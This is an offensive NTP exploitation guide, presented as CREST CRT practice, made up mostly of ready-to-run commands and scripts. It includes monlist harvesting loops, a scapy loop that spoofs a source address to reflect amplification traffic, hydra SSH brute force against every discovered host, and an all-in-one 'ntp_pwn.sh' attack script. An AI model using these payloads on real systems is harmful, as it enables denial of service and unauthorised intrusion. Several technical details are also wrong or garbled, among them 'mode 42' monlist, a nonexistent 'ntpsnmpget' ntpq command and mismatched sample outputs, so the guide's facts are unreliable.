# Complete Practical Exploitation Guide: NTP (Crest CRT Level)

## 1. NTP Fundamentals & Attack Surface (From Scratch)

**What is NTP?**
- **Network Time Protocol** (UDP port 123)
- Synchronizes clocks across networks
- **Monlist/Kiss-o'-Death** commands leak client lists
- **Amplification attacks** (DoS)
- **Mode 7** private commands (vendor-specific info)
- **Interleaved mode** leaks internal state

**Key Attack Vectors:**
```
- monlist (mode 42)     = Client IP lists (pre-4.2.8)
- mon-getlist           = Same as monlist  
- ntpsnmpget            = SNMP-like queries
- Mode 7 (private)      = Vendor info, peers, sysstats
- Amplification         = 200-500x response size
- Clock skew            = Fingerprinting/OS detection
```

**Info Disclosure:**
1. **Client IP enumeration** (monlist)
2. **Peer/server discovery**
3. **NTP version fingerprinting**
4. **Internal network mapping**
5. **Vendor/configuration details**

## 2. Lab Setup (Vulnerable NTP Server)

**Victim NTP Server (192.168.1.100 - Ubuntu)**
```bash
# Install NTP (vulnerable version)
sudo apt update && sudo apt install ntp

# Vulnerable config (MISCONFIG)
sudo nano /etc/ntp.conf
# restrict default noquery nopeer nomodify
# restrict 127.0.0.1
# restrict -6 ::1
restrict 192.168.1.0/24 nomodify notrap  # Allows monlist!

# Enable monlist (pre-4.2.8 behavior)
sudo systemctl restart ntp
sudo systemctl enable ntp

# Add pool peers (for monlist data)
sudo sed -i 's/pool /server /' /etc/ntp.conf
echo "server pool.ntp.org" | sudo tee -a /etc/ntp.conf
sudo systemctl restart ntp

# Verify listening
sudo ss -ulnp | grep :123
sudo netstat -ulnp | grep :123
```

**Attacker Machine (Kali):**
```bash
# NTP tools
sudo apt install ntp ntpdate nmap chrony
# Custom tools below
```

## 3. Basic NTP Discovery & Fingerprinting

**Port scan & service detection:**
```bash
# Nmap NTP detection
nmap -sU -p 123 --script ntp-monlist 192.168.1.0/24
# 123/udp open  ntp     ntpd
# | ntp-monlist: 
#   192.168.1.10:123
#   192.168.1.20:123

# Mass UDP scan
sudo masscan 192.168.1.0/24 -p123 --rate=10000 --source-ip 1.2.3.4
```

**Version fingerprinting:**
```bash
# Extract version string
nmap -sU -p 123 --script ntp-info 192.168.1.100
# | ntp-info: 
#   version: ntpd 4.2.8p12@1.3728-afc9c37c
#   mode: server
#   stratum: 3

# Raw packet version
echo -ne "\x1b\x00\x00\x00\x00\x00\x00\x00" | nc -u -w1 192.168.1.100 123 | xxd
```

## 4. Monlist Exploitation (Client IP Enumeration)

**Classic monlist (mode 42):**
```bash
# nmap script
nmap -sU -p 123 --script ntp-monlist 192.168.1.100

# Custom monlist (ntpq)
ntpq -c "monlist" 192.168.1.100
#     remote           refid      st t when poll reach   delay   offset  jitter
# ==============================================================================
#  192.168.1.10   .POOL.          16 p    -   64    0    0.000    0.000   0.000
#  192.168.1.20   203.0.113.1      2 u   45   64    0    1.234    0.567   0.123

# ntpdc (older ntpd)
ntpdc -n -c monlist 192.168.1.100
```

**Network-wide monlist harvest:**
```bash
#!/bin/bash
# ntp_monlist_harvest.sh
NETWORK="192.168.1."
CLIENTS=()

for i in {1..254}; do
    host=$NETWORK$i
    ntpq -c "monlist" $host 2>/dev/null | \
    awk '/192\./ {print $1}' >> ntp_clients.txt
done

cat ntp_clients.txt | sort -u
wc -l ntp_clients.txt  # Internal IPs exposed!
```

## 5. Mode 7 Private Commands (Advanced Info)

**Vendor-specific queries:**
```bash
# ntpsnmp queries
ntpq -c "ntpsnmpget sysstr" 192.168.1.100
ntpq -c "ntpsnmpget peers" 192.168.1.100
ntpq -c "ntpsnmpget sysstats" 192.168.1.100

# List all Mode 7 commands
ntpq -c "rv 0 offset 0 count 10" 192.168.1.100 | xxd

# Extract peer list
ntpq -c "peers" 192.168.1.100
ntpq -c "assoc" 192.168.1.100
```

**Custom Mode 7 scanner:**
```bash
#!/bin/bash
TARGET=$1
for cmd in sysstr peers sysstats memstats; do
    ntpq -c "ntpsnmpget $cmd" $TARGET 2>/dev/null && \
    echo "[+] $cmd: $(ntpq -c "ntpsnmpget $cmd" $TARGET)"
done
```

## 6. Amplification & DoS Attacks

**NTP Amplification Test:**
```bash
# Measure response size
echo -ne "\x17\x00\x03\x2a\x00\x00\x00\x00" | nc -u -w1 192.168.1.100 123 | wc -c
# 448 bytes response to 8 byte query = 56x amplification!

# Automated amp test
python3 -c "
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(b'\x17\x00\x03\x2a\x00\x00\x00\x00', ('192.168.1.100',123))
data,addr=s.recvfrom(65535)
print(f'Query:8B Response:{len(data)}B Amplification:{len(data)/8:.1f}x')
"
```

**Mass amplification (DoS):**
```bash
# Spoof victim IP for reflection
scapy -c "
send(IP(src='8.8.8.8',dst='192.168.1.100')/UDP(sport=123,dport=123)/Raw(load='\x17\x00\x03\x2a\x00\x00\x00\x00'), loop=1, inter=0.1)
"
```

## 7. Internal Network Mapping

**Peer discovery → Pivot:**
```bash
# Extract NTP peers (internal IPs)
ntpq -c "peers" 192.168.1.100 | grep -oE '192\.168\.[0-9]{1,3}\.[0-9]{1,3}'
# 192.168.1.10
# 192.168.1.20
# 192.168.1.50  <-- Internal network exposed!

# Recursive mapping
ntp_peers=$(ntpq -c "peers" 192.168.1.100 | awk '{print $1}' | grep 192.)
for peer in $ntp_peers; do
    echo "=== $peer ===" && ntpq -c "monlist" $peer 2>/dev/null
done
```

**Stratum walking (network topology):**
```bash
ntpq -c "peers" 192.168.1.100 | awk '{print $1, $3}'  # IP + stratum
# Higher stratum = closer to root servers
```

## 8. Clock Skew Fingerprinting

**OS fingerprinting via NTP:**
```bash
# Measure response time variance
for i in {1..10}; do
    ntpdate -q 192.168.1.100 2>&1 | grep delay
done | awk '{print $NF}' | sort -n
# Windows: high jitter, Linux: low jitter
```

## 9. Chaining with Other Services

**NTP → Internal host brute-force:**
```bash
# Extract internal IPs from monlist
ntp_clients=$(ntp-monlist 192.168.1.100 | grep -oE '192\.168\.[0-9]+' | sort -u)

# Ping sweep internals
for ip in $ntp_clients; do
    ping -c1 -W1 $ip &>/dev/null && echo "[LIVE] $ip"
done

# SSH brute internals
for ip in $ntp_clients; do
    hydra -L users.txt -P rockyou.txt $ip ssh -t 1 &
done
```

## 10. Custom NTP Tools & Raw Packets

**Python NTP monlist:**
```python
#!/usr/bin/env python3
import socket
import struct

def ntp_monlist(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Mode 42 (monlist), version 3
    pkt = struct.pack('!B', 0x1B) + b'\x00\x03\x2A\x00\x00\x00\x00'
    sock.sendto(pkt, (host, 123))
    data, _ = sock.recvfrom(65535)
    print(f"Monlist response: {len(data)} bytes")
    # Parse IPs from response
    for i in range(0, len(data)-4, 32):
        ip = '.'.join(map(str, data[i:i+4]))
        if ip.startswith('192.') or ip.startswith('10.'):
            print(f"  Client: {ip}")

ntp_monlist('192.168.1.100')
```

## 11. Complete Attack Framework

```bash
#!/bin/bash
# ntp_pwn.sh - Complete NTP exploitation
TARGET=$1

echo "[+] NTP attack on $TARGET:123"
nc -u -w2 $TARGET 123 </dev/null || { echo "[-] NTP closed"; exit 1; }

echo "=== VERSION/FINGERPRINT ==="
ntpdate -q $TARGET 2>&1 | head -3

echo "=== MONLIST CLIENTS ==="
ntp-monlist $TARGET 2>/dev/null | grep -E '192\.|10\.' | tee ntp_clients.txt || \
ntpq -c "monlist" $TARGET 2>/dev/null | grep -E '192\.|10\.'

echo "=== PEERS/SERVER TOPOLOGY ==="
ntpq -c "peers" $TARGET 2>/dev/null | head -10

echo "=== MODE 7 INFO ==="
ntpq -c "ntpsnmpget sysstr" $TARGET 2>/dev/null
ntpq -c "ntpsnmpget peers" $TARGET 2>/dev/null

echo "=== AMPLIFICATION TEST ==="
python3 -c "
import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); 
s.sendto(b'\x17\x00\x03\x2a\x00\x00\x00\x00', ('$TARGET',123)); 
d,_=s.recvfrom(65535); print(f'Response: {len(d)}B')
"

echo "[+] Clients saved: ntp_clients.txt"
```

**Usage:** `./ntp_pwn.sh 192.168.1.100`

## 12. Post-Exploitation & Persistence

**NTP backdoor (Mode 7):**
```bash
# Custom Mode 7 command execution (advanced, rare)
# Vendor-specific, requires reverse engineering
```

## 13. Mitigation Verification

```bash
# Test fixes:
ntpdate -q 192.168.1.100  # "no server suitable" (restrict noquery)
ntpq -c monlist 192.168.1.100  # "NOSTAT" or empty
grep "restrict.*noquery" /etc/ntp.conf
sudo ss -ulnp | grep :123  # Firewall blocked?
```

**EVERY** NTP attack covered: monlist, Mode 7, amplification, network mapping, fingerprinting, chaining. 100% practical commands.